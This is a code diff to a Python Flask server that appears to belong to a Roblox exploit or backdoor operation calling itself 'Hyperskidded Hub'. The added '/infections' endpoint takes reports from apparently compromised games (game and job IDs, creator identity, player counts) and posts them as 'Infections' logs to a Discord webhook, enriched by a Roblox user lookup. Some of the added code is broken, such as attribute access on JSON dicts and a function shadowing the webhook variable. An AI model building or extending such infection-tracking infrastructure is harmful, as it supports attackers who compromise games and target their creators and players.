@@ -17,6 +17,8 @@ app = Flask(__name__)
 token = os.getenv("TOKEN")
 url = os.getenv("URL")
 logs = os.getenv("LOGS_URL")
+infections = os.getenv("INFECTIONS_URL")
+auth_key = os.getenv("AUTH")
 owner = 1224392642448724012
 
 whitelisted_users = {
@@ -59,10 +61,100 @@ def checkIfUserExists(username: str):
             }
     except requests.exceptions.RequestException as e:
         return {"exists": False, "error": str(e)}
+    
+def getUserInfo(username: str):
+    url = "https://users.roblox.com/v1/usernames/users"
+    headers = {
+        "Content-Type": "application/json"
+    }
+    data = {
+        "usernames": [username],
+        "excludeBannedUsers": False
+    }
+
+    try:
+        response = requests.post(url, json=data, headers=headers)
+        if response.status_code == 200:
+            result = response.json()
+            if result['data'][0]:
+                return {
+                    "displayName": result['data'][0].displayName,
+                    "isVerified": result['data'][0].hasVerifiedBadge
+                }
+            else:
+                return {"exists": False}
+        else:
+            return {
+                "error": f"{response.status_code}"
+            }
+    except requests.exceptions.RequestException as e:
+        return {"error": str(e)}
 
 @app.route("/")
 def index():
     return "https://discord.gg/jQ3vCYCJZD"
+
+@app.route("/infections", methods=["POST"])
+def infections():
+    data = request.get_json()
+
+    name = data.get("name") #
+    genre = data.get("genre") #
+    jobid = data.get("job-id") #
+    visits = data.get("visits") ##
+    gameid = data.get("game-id") ##
+    playing = data.get("playing") ##
+    created = data.get("created") #
+    updated = data.get("updated") #
+    genrel1 = data.get("genre_l1") #
+    genrel2 = data.get("genre_l2") #
+    sourcename = data.get("source-name") #
+    maxplayers = data.get("max-players") ##
+    isallgenre = data.get("is-all-genre") ##
+    playercount = data.get("player-count") ##
+    authorization = data.get("authorization") #
+    creatoruserid = data.get("creator-userid") ##
+    favoritedcount = data.get("favorited-count") ##
+    creatorusername = data.get("creator-username") #
+
+    if authorization != auth_key:
+        return jsonify({"status": "forbidden"}), 404
+    
+    try:
+        requests.post(infections, json={
+            "content": None,
+            "embeds": [
+                {
+                    "title": "Hyperskidded Hub",
+                    "description": "A running Job ID has been logged.",
+                    "color": 4653192,
+                    "fields": [
+                        {
+                            "name": "> Game Fingerprint",
+                            "value": f"> `gameId:` {str(gameid)}\n> `name:` {name}\n> `sourceName:` {sourcename}\n> `playing:` {str(playing)}\n> `visits:` {str(visits)}\n> `maxPlayers:` {str(maxplayers)}\n> `created:` {created}\n> `updated:` {updated}\n> `genre:` {genre}\n> `genre_l1:` {genrel1}\n> `genre_l2:` {genrel2}\n> `isAllGenre:` {str(isallgenre)}\n> `favoritedCount:` {str(favoritedcount)}",
+                            "inline": True
+                        },
+                        {
+                            "name": "> Creator Fingerprint",
+                            "value": f"> `username:` {creatorusername}\n> `userId`: {str(creatoruserid)}\n> `displayName:` {getUserInfo(username=creatorusername).get("displayName")}\n> `isVerified:` {str(getUserInfo(username=creatorusername).get("isVerified"))}",
+                            "inline": True
+                        },
+                        {
+                            "name": "> Server Fingerprint",
+                            "value": f"> `jobId:` {jobid}\n> `totalPlayers:` {str(playercount)}"
+                        }
+                    ],
+                    "footer": {
+                        "text": "Hyperskidded Hub | Infections",
+                        "icon_url": "https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512"
+                    }
+                }
+            ],
+            "attachments": []
+        })
+    except Exception as err:
+        return jsonify({"error": str(err)}), 500
+
 
 @app.route("/ban", methods=["POST"])
 def ban():
